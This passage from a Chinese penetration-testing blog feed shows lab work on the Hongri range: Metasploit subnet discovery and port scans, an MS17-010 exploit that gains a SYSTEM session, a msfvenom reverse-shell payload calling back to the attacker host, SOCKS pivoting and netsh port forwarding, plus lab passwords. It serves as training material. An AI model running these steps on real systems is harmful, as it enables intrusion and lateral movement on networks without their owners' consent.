192.168.52.1，192.168.52.254，192.168.52.255 都是无关紧要的网关或者广播地址之类的，不用管。</p><p>那么就提取到了两个已知目标：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.138        00-0c-29-1e-96-24     dynamic</span><br><span class="line">192.168.52.143        00-0c-29-22-d2-55     dynamic</span><br></pre></td></tr></table></figure><p><strong>除此之外，也可以通过 msf 查看路由信息，发现内网网段：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: 192.168.43.0/255.255.255.0</span><br><span class="line">Local subnet: 192.168.52.0/255.255.255.0</span><br><span class="line">Local subnet: ::/ffff:ffff::</span><br><span class="line">Local subnet: ::1/ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">Local subnet: 2408:8453:f53a:68a8::/ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line">Local subnet: 2408:8453:f53a:68a8:e8b6:6970:f9e1:6003/ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">Local subnet: fe80::/ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line">Local subnet: fe80::/ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line">Local subnet: fe80::cc27:7c90:8e9e:d18e/ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">Local subnet: fe80::e8b6:6970:f9e1:6003/ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">Local subnet: ff00::/ff00::</span><br><span class="line">Local subnet: ff00::/ff00::</span><br><span class="line">Local subnet: ff00::/ff00::</span><br></pre></td></tr></table></figure><h3 id="msf-内网端口扫描"><a href="#msf-内网端口扫描" class="headerlink" title="msf 内网端口扫描"></a>msf 内网端口扫描</h3><h5 id="msf-端口扫描的模块"><a href="#msf-端口扫描的模块" class="headerlink" title="msf 端口扫描的模块"></a>msf 端口扫描的模块</h5><p>先查看一下支持的端口扫描类型：</p><img src="/images/image-20210802220402222"><h6 id="ACK-防火墙扫描"><a href="#ACK-防火墙扫描" class="headerlink" title="ACK 防火墙扫描"></a>ACK 防火墙扫描</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/ack</span><br></pre></td></tr></table></figure><img src="/images/image-20210802221051213"><img src="/images/image-20210802221028110"><h6 id="SYN-端口扫描"><a href="#SYN-端口扫描" class="headerlink" title="SYN 端口扫描"></a>SYN 端口扫描</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/syn</span><br></pre></td></tr></table></figure><img src="/images/image-20210802221347177"><p>通过 <code>wireshark</code> 抓包可以看到，底层是通过发送 <code>SYN</code> 数据包去建立三次握手，通过回应的数据包来判断端口是否打开：</p><img src="/images/image-20210802221729412"><h6 id="TCP-端口扫描"><a href="#TCP-端口扫描" class="headerlink" title="TCP 端口扫描"></a>TCP 端口扫描</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><img src="/images/image-20210802222330200"><p>同样使用 <code>wireshark</code> 抓包查看，发现和 SYN 扫描原理差不多，区别在于这种扫描会完成三次握手的连接，SYN 扫描直接发送一个 RST 数据包去拒绝连接：</p><img src="/images/image-20210802222420247"><h6 id="xmas-扫描"><a href="#xmas-扫描" class="headerlink" title="xmas 扫描"></a>xmas 扫描</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/xmas</span><br></pre></td></tr></table></figure><img src="/images/image-20210802225954520"><p><code>xmas</code> 扫描通过发送 <code>fin</code> 数据包，根据目标端口是否有回应来判断端口是否打开：</p><img src="/images/image-20210802230451241"><h6 id="扫描各服务版本"><a href="#扫描各服务版本" class="headerlink" title="扫描各服务版本"></a>扫描各服务版本</h6><img src="/images/image-20240412181426301.png"><h5 id="msf-两种内网扫描方式"><a href="#msf-两种内网扫描方式" class="headerlink" title="msf 两种内网扫描方式"></a>msf 两种内网扫描方式</h5><p>对上述两个目标进行端口或服务扫描，可以通过配置 msf 路由和 msf 代理来实现。</p><h6 id="msf-路由"><a href="#msf-路由" class="headerlink" title="msf 路由"></a>msf 路由</h6><p>通过添加路由的方式让 kali 能访问到内网中的其他机器。</p><p>打印路由表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br></pre></td></tr></table></figure><p>添加路由至本地（添加完后记得再打印一次路由表看添加是否成功）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># meterpreter 原始方法</span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0/24</span><br><span class="line"></span><br><span class="line"># 或者使用新方法自动添加路由</span><br><span class="line">meterpreter &gt; run post/multi/manage/autoroute</span><br><span class="line"></span><br><span class="line"># 或者在 msf 控制台中添加路由</span><br><span class="line">msf6 exploit(multi/handler) &gt; route add 192.168.52.0/24 [session ID]</span><br></pre></td></tr></table></figure><p>退回至 msf 控制台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br></pre></td></tr></table></figure><p>在 msf 控制台打印路由表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; route print</span><br></pre></td></tr></table></figure><p><strong>msf 使用端口扫描模块（TCP 端口扫描器）：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><p><code>auxiliary/scanner/portscan/tcp</code> 模块设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.52.138#设置要扫描的内网IP</span><br><span class="line">set threads 10#设置线程数，影响速度快慢</span><br><span class="line">set ports 1-500#设置要扫描的端口范围</span><br><span class="line">run#开始扫描</span><br></pre></td></tr></table></figure><h6 id="MS17-010-内网渗透"><a href="#MS17-010-内网渗透" class="headerlink" title="MS17-010 内网渗透"></a>MS17-010 内网渗透</h6><p>搜索有关此漏洞的利用模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><p>使用 <code>exploit/windows/smb/ms17_010_psexec</code> 模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 1</span><br></pre></td></tr></table></figure><p>模块选项设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.52.138</span><br></pre></td></tr></table></figure><p>开始执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p>执行结果：</p><img src="/images/image-20240413122008930.png"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><p>前面的执行都不报错，最后出现这种结果，是因为 <strong>kali 能通过各种方式访问到内网中的机器，而内网中的机器无法访问到 kali ，因此无法建立反弹 shell</strong> 。</p><p>既然反弹 shell 不行，那就建立正向连接。可以看到，该模块默认的 payload 为 <code>windows/meterpreter/reverse_tcp</code> ：</p><img src="/images/image-20240413122250878.png"><p>将 payload 改为 <code>windows/meterpreter/bind_tcp</code> 正向连接（kali 主动去连接目标机器）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure><p>再次执行，成功获取连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.52.138:445 - Target OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1</span><br><span class="line">[*] 192.168.52.138:445 - Built a write-what-where primitive...</span><br><span class="line">[+] 192.168.52.138:445 - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[*] 192.168.52.138:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.52.138:445 - Executing the payload...</span><br><span class="line">[+] 192.168.52.138:445 - Service start timed out, OK if running a command or non-service executable...</span><br><span class="line">[*] Started bind TCP handler against 192.168.52.138:4444</span><br><span class="line">[*] Sending stage (176198 bytes) to 192.168.52.138</span><br><span class="line">[*] Meterpreter session 9 opened (192.168.52.128:51814 -&gt; 192.168.52.138:4444 via session 8) at 2024-04-13 00:31:52 -0400</span><br></pre></td></tr></table></figure><p>查看系统信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : OWA</span><br><span class="line">OS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : GOD</span><br><span class="line">Logged On Users : 3</span><br><span class="line">Meterpreter     : x86/windows</span><br></pre></td></tr></table></figure><h6 id="msf-代理"><a href="#msf-代理" class="headerlink" title="msf 代理"></a>msf 代理</h6><p>简单地说，就是将 kali 能够直接访问到的机器作为代理，进而访问内网中的其他机器。想要配置 msf 代理，那么必须先配置好 msf 路由。</p><p><strong>socks 协议</strong> </p><p>socks 协议工作在会话层，能为各种协议提供代理服务。socks4 与 socks5 的区别在于除了 tcp 协议外，socks5 还支持 udp 协议。</p><p><strong>使用 auxiliary&#x2F;server&#x2F;socks_proxy 模块设置代理：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br></pre></td></tr></table></figure><p>直接运行即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p>查看代理设置是否成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jobs</span><br></pre></td></tr></table></figure><p>设置成功之后就可以利用此代理进行内网扫描了。</p><p>关闭代理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jobs -k [ID] #关闭指定ID的代理</span><br><span class="line">jobs -K #关闭所有代理</span><br></pre></td></tr></table></figure><p>**利用 proxychains 使用此代理（当然在其他地方用也是可以的） ** </p><p>在 proxychains 配置文件的最后一行添加如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure><p>测试代理配置是否成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl http://192.168.52.143/</span><br></pre></td></tr></table></figure><p>成功得到返回值，说明此时能够访问内网。</p><p>那么就可以利用 namp 之类的工具进行扫描了，比如主机发现（未验证成功）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sn 192.168.52.0/24</span><br></pre></td></tr></table></figure><p>再比如 dirb 目录扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains dirb http://192.168.52.143/</span><br></pre></td></tr></table></figure><p>不过，由于 socks5 仅支持 TCP&#x2F;UDP 及以上协议，所以有些不使用这些协议的工具是没办法用 socks 代理的。</p><p><strong>使用 msf 进行主机发现</strong> </p><p>设置好代理之后也可以用 msf 的模块进行内网主机发现。</p><p>使用 auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep 模块进行内网主机发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure><p>设置模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.52.0/24</span><br><span class="line">set threads 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;收集内网 IP ，进行端口扫描。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="https://changeyourway.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透 01 - 端口转发</title>
    <link href="https://changeyourway.github.io/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F01-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <id>https://changeyourway.github.io/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F01-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
    <published>2024-05-16T02:55:28.868Z</published>
    <updated>2024-05-16T03:01:54.880Z</updated>
    
    <content type="html"><![CDATA[<p>在进行渗透测试过程中会遇到内网中的其他机器是不允许外网机器访问的，因此需要通过端口转发(即隧道)或将得到的外网服务器设置为代理，使得攻击机可以直接访问并操作内网中的其他机器，这一过程就叫做内网转发。</p><span id="more"></span><h2 id="红日靶场（一）搭建"><a href="#红日靶场（一）搭建" class="headerlink" title="红日靶场（一）搭建"></a>红日靶场（一）搭建</h2><p>推荐博客：<a href="https://blog.csdn.net/m0_46363249/article/details/121441832">[WEB安全]红日靶场（一）环境搭建</a></p><p>初始密码：hongrisec@2019</p><p>设置好网段如下：</p><img src="/images/image-20240406132032083.png"><p>在此划分出 VMnet1 和 VMnet8 两个网段，VMnet1 为 Windows 虚拟机的内网网段，VMnet8 为模拟的外网网段。</p><p>可以在物理机 win11 上查看：</p><img src="/images/image-20240406132728218.png"><p>win2003 太抽象了，所以换成 win2019 。</p><p>最终形成的 IP 划分情况如下：</p><table><thead><tr><th>主机</th><th>IP地址</th></tr></thead><tbody><tr><td>物理机 win11</td><td>192.168.217.1（ VMnet8 的 IP ）</td></tr><tr><td>win7 边界服务器</td><td>外网IP：192.168.217.137；内网IP：192.168.52.143</td></tr><tr><td>win2008</td><td>内网IP：192.168.52.138</td></tr><tr><td>win2019</td><td>内网IP：192.168.52.128</td></tr><tr><td>win2003（弃用）</td><td>内网IP：192.168.52.141</td></tr></tbody></table><p>提示密码过期，那么我们重新设置一下密码：</p><p>win7：win7@test</p><p>win server 2003（弃用）：win2003@test</p><p>win server 2008：win2008@test</p><p>win server 2019：Administrator - ChinaSkills22</p><p>内网环境至此就搭好了，其中 win7 为边界服务器，在外网中开放，而 win2008 和 win2019 不对公网开放。</p><p>在测试时，一定要将 Windows 的防火墙全部关闭哦~</p><p><strong>但是，按照上面的搭建方法，即使 kali 在 VMnet8 网段中，也能访问到 VMnet1 网段（即内网）的机器，这明显不符合要求。因此，我将 kali 与 win7 的其中一个网卡设置为桥接网卡，抛弃了 VMnet8 网段，但也因此无法使用校园网。在这种情况下，kali 就只能访问 win7 的外网 IP ，而无法访问内网网段了。</strong> </p><p>此时我的 kali IP：192.168.43.173，win 7 外网 IP：192.168.43.136 。</p><p><strong>之后遇到的问题就是 shell 没有办法上传到 win7 虚拟机上，无论是复制粘贴还是 mount 挂载，于是我又做了一些调整，将 win2019 作为边界服务器，在外网开放，而 win7 则作为内网机器。</strong> </p><p>此时我的 win2019 的外网 IP 为：192.168.43.13 。</p><p><strong>xampp</strong> </p><p>XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。</p><p><strong>perl</strong> </p><p>Perl 是由 Larry Wall 设计的，并由他不断更新和维护的编程语言。</p><p>Perl 具有高级语言（如 C ）的强大能力和灵活性。事实上，你将看到，它的许多特性是从 C 语言中借用来的。</p><p>Perl 与脚本语言一样，Perl 不需要编译器和链接器来运行代码，你要做的只是写出程序并告诉 Perl 来运行而已。这意味着 Perl 对于小的编程问题的快速解决方案和为大型事件创建原型来测试潜在的解决方案是十分理想的。</p><p>Perl 提供脚本语言（如 sed 和 awk ）的所有功能，还具有它们所不具备的很多功能。Perl 还支持 sed 到 Perl 及 awk 到 Perl 的翻译器。</p><p>简而言之，Perl 像 C 一样强大，像 awk 、sed 等脚本描述语言一样方便。</p><h2 id="通过上传-shell-使-kali-控制-win2019"><a href="#通过上传-shell-使-kali-控制-win2019" class="headerlink" title="通过上传 shell 使 kali 控制 win2019"></a>通过上传 shell 使 kali 控制 win2019</h2><h3 id="mount-挂载共享文件夹"><a href="#mount-挂载共享文件夹" class="headerlink" title="mount 挂载共享文件夹"></a>mount 挂载共享文件夹</h3><p>推荐博客：<a href="https://juejin.cn/post/7025786131392233485">Linux 挂载 Windows 共享目录</a> </p><p>创建要共享的文件夹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /mnt/myshare</span><br></pre></td></tr></table></figure><p>挂载共享文件夹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t cifs -o username=miao,password=Ab123456 //192.168.43.13/tiquan /mnt/myshare</span><br></pre></td></tr></table></figure><p>查询挂载状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br></pre></td></tr></table></figure><p>解除挂载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">umount /mnt/myshare</span><br></pre></td></tr></table></figure><h3 id="msf-生成-payload："><a href="#msf-生成-payload：" class="headerlink" title="msf 生成 payload："></a>msf 生成 payload：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.43.173 lport=4444 -a x64 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><p>通过 mount 挂载的共享文件夹将 shell 传到 win2019 上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp shell.exe /mnt/myshare/shell.exe</span><br></pre></td></tr></table></figure><p>进入 msf 控制台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br></pre></td></tr></table></figure><p>使用 use 进入模块，exploit&#x2F;multi&#x2F;handler 是 msf 的侦听模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><p>设置 kali 的 IP 和端口号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.43.173</span><br><span class="line">set lport 4444</span><br></pre></td></tr></table></figure><p>开启监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run/exploit</span><br></pre></td></tr></table></figure><p>此时在 win2019 上执行 shell.exe 即可。</p><p>从 meterpreter 进入 Windows 命令行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>解决编码问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><h2 id="内网渗透-端口转发"><a href="#内网渗透-端口转发" class="headerlink" title="内网渗透-端口转发"></a>内网渗透-端口转发</h2><p>在进行渗透测试过程中会遇到内网中的其他机器是不允许外网机器访问的，因此需要通过端口转发(即隧道)或将得到的外网服务器设置为代理，使得攻击机可以直接访问并操作内网中的其他机器，这一过程就叫做内网转发。</p><p>端口映射（Port Mapping）和端口转发（Port Forwarding）是网络配置中的两个概念，虽然有相似之处，但它们在用途和实现上有一些不同之处。</p><h3 id="端口映射（Port-Mapping）"><a href="#端口映射（Port-Mapping）" class="headerlink" title="端口映射（Port Mapping）"></a>端口映射（Port Mapping）</h3><p><strong>定义</strong>： 端口映射是一种将一个特定的端口号映射到另一个端口号的技术，通常用于路由器或防火墙来允许外部设备通过特定端口访问内部网络中的设备。</p><p><strong>用法</strong>：</p><ul><li>通常用于在内网（如局域网）中的某个设备（如服务器）需要被外部网络访问时，路由器或防火墙通过将外部请求的端口映射到内部设备的相应端口来实现。</li><li>例如，外部设备通过访问路由器的端口 80 来访问内网服务器的端口 8080 。</li></ul><p><strong>示例</strong>： 假设你有一个家庭网络，其中一台计算机运行一个 Web 服务器，监听端口 8080 。你希望外部用户能够通过访问你家庭网络的公共 IP 地址上的端口 80 来访问这个 Web 服务器。</p><ul><li>公共 IP 地址：203.0.113.1</li><li>内部 IP 地址：192.168.1.100</li><li>内部 Web 服务器端口：8080</li></ul><p>在路由器上设置端口映射，将公共 IP 的端口 80 映射到内部 IP 地址的端口 8080 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">203.0.113.1:80 -&gt; 192.168.1.100:8080</span><br></pre></td></tr></table></figure><h3 id="端口转发（Port-Forwarding）"><a href="#端口转发（Port-Forwarding）" class="headerlink" title="端口转发（Port Forwarding）"></a>端口转发（Port Forwarding）</h3><p><strong>定义</strong>： 端口转发是一种将网络流量从一个 IP 地址的特定端口重定向到另一个 IP 地址的特定端口的技术。这通常用于将外部网络的流量重定向到内部网络中的特定设备。</p><p><strong>用法</strong>：</p><ul><li>主要用于将外部网络的请求转发到内网中的设备，以实现对内网资源的访问。</li><li>比端口映射更广泛，通常不仅仅是端口号的映射，还包括 IP 地址的重定向。</li><li>通常用于允许外部设备通过路由器或防火墙访问内网设备上的服务。</li></ul><p><strong>示例</strong>： 与上例类似，但这次我们不仅重定向端口，还重定向流量到另一个内部设备：</p><ul><li>公共 IP 地址：203.0.113.1</li><li>内部 Web 服务器 IP 地址：192.168.1.100</li><li>内部 Web 服务器端口：80</li></ul><p>设置端口转发，将公共 IP 的端口 80 上的流量重定向到内部 Web 服务器的 IP 地址和端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">203.0.113.1:80 -&gt; 192.168.1.100:80</span><br></pre></td></tr></table></figure><h3 id="区别总结"><a href="#区别总结" class="headerlink" title="区别总结"></a>区别总结</h3><ul><li><strong>端口映射（Port Mapping）</strong>：主要涉及端口号的映射，可以将外部端口映射到内部不同的端口。常用于在路由器或防火墙上设置特定的端口映射规则。</li><li><strong>端口转发（Port Forwarding）</strong>：不仅可以涉及端口号的重定向，还可以涉及 IP 地址的重定向。常用于将外部网络的请求转发到内网中的设备，以实现对内网资源的访问。</li></ul><p>尽管术语有时可以互换使用，但严格来说，端口转发更广泛，包含了端口映射的功能，但也涉及更复杂的流量重定向规则。</p><h3 id="windows-命令行下用-netsh-实现端口转发"><a href="#windows-命令行下用-netsh-实现端口转发" class="headerlink" title="windows 命令行下用 netsh 实现端口转发"></a>windows 命令行下用 netsh 实现端口转发</h3><p>自 Windows XP 开始，Windows 中就内置网络端口转发的功能。任何传入到本地端口的 TCP 连接（ IPv4 或 IPv6 ）都可以被重定向到另一个本地端口，或远程计算机上的端口，并且系统不需要有一个专门用于侦听该端口的服务。</p><p>在 Linux 中，使用 iptables 可以非常轻松地配置端口重定向。在 Windows Server 系统上，我们可以使用命令 Netsh 的 Portproxy 模式配置 Windows 中的端口转发。</p><p>netsh 命令已经推出很长时间，在 Windows 2000&#x2F;XP&#x2F;2003 中均带有 netsh 命令。Windows Server 2008 只是对 netsh 的参数项做了些扩展。</p><p><strong>用法：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport</span><br></pre></td></tr></table></figure><blockquote><p>add v4tov4 - 添加 IPv4 </p><p>listenaddress - 等待连接的本地 IP 地址。</p><p>listenport - 本地侦听 TCP 端口。</p><p>connectaddress - 将传入连接重定向到本地或远程 IP 地址（或 DNS 名称）。</p><p>connectport - 一个 TCP 端口，来自 listenport 的连接会被转发到该端口。</p></blockquote><p><strong>本地端口转发到本地端口示例：</strong> </p><p>将本地端口 3389 转发到本地端口 3340 ，其中，本地端口为 10.1.1.110 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110</span><br></pre></td></tr></table></figure><p><strong>使用 netstat 确定 3340 端口当前处于被侦听状态：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr:3340</span><br><span class="line">或者</span><br><span class="line">netstat -antp tcp</span><br></pre></td></tr></table></figure><p><strong>显示系统中的转发规则列表：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure><p>在我们的例子中，只有一个转发规则即从3340到3389端口的转发：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Listen on ipv4:             Connect to ipv4:</span><br><span class="line">Address         Port        Address         Port</span><br><span class="line">--------------- ----------  --------------- ----------</span><br><span class="line">10.1.1.110     3340        10.1.1.110     3389</span><br></pre></td></tr></table></figure><p><strong>删除指定的端口转发规则：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=3340 listenaddress=10.1.1.110</span><br></pre></td></tr></table></figure><p><strong>清除所有当前的端口转发规则：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy reset</span><br></pre></td></tr></table></figure><p><strong>重要：</strong>以上端口转发仅适用于 TCP 端口，对于 UDP 端口将不起作用，并且不能使用 127.0.0.1 作为连接地址。</p><p><strong>将其他机器的端口转发至本机端口，比如将 192.168.100.101 的 3389 端口转发至本机的 3389 端口：</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=3389 connectport=3389 connectaddress=192.168.100.101</span><br></pre></td></tr></table></figure><p>这样执行完以后，访问本机的 3389 端口就可以访问到 192.168.100.101 的 3389 端口了。</p><p>3389 端口通常为 Windows 的远程桌面连接，因此需要先开启 Windows 的远程桌面连接才能实现端口转发，开启后，使用以下命令查看端口开放情况：</p><figure class="highlight 